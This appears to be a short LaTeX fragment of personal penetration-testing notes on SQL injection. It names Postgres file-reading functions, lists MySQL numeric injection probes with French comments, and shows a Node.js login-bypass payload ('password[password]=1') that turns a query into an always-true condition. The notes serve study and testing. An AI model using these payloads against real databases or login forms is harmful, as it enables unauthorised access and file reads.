\section{Postgres SQLi}

\subsection{Reading/writting files}
\url{http://shuber.io/reading-from-the-filesystem-with-postgres/}

\begin{verbatim}
select pg_ls_dir

pg_read_file
\end{verbatim}


\section{MySQL}

\url{https://www.asafety.fr/en/mysql-injection-cheat-sheet/}

\subsection{testing}

\subsubsection{Numeric value}

Considering the following request
\begin{verbatim}
SELECT * FROM Table WHERE data = [INJ];
\end{verbatim}

\begin{verbatim}
AND 1 	True
AND 0 	False
AND true 	True
AND false 	False
1-false 	Retourne 1 si vulnérable
1-true 	Retourne 0 si vulnérable
1*1337 	Retourne 1337 si vulnérable
\end{verbatim}



\section{NodeJS}

\href{https://www.stackhawk.com/blog/node-js-sql-injection-guide-examples-and-prevention/}{Node.js
SQL Injection Guide}

\begin{verbatim}
app.post("/auth", function (request, response) {
 var username = request.body.username;
 var password = request.body.password;
 if (username && password) {
  connection.query(
   "SELECT * FROM accounts WHERE username = ? AND password = ?",
   [username, password],
   function (error, results, fields) {
    ...
   }
  );
 }
});
...
\end{verbatim}

\begin{verbatim}
body: "username=admin&password[password]=1"
\end{verbatim}

In this example, the attacker is passing in a value that gets evaluated as an Object instead of a String value, and results in the following SQL query:

\begin{verbatim}
SELECT * FROM accounts WHERE username = 'admin' AND password = `password` = 1
\end{verbatim}
The \verb+password = `password` = 1+ part evaluates to \verb+TRUE+ and is a
\verb+1=1+ attack.
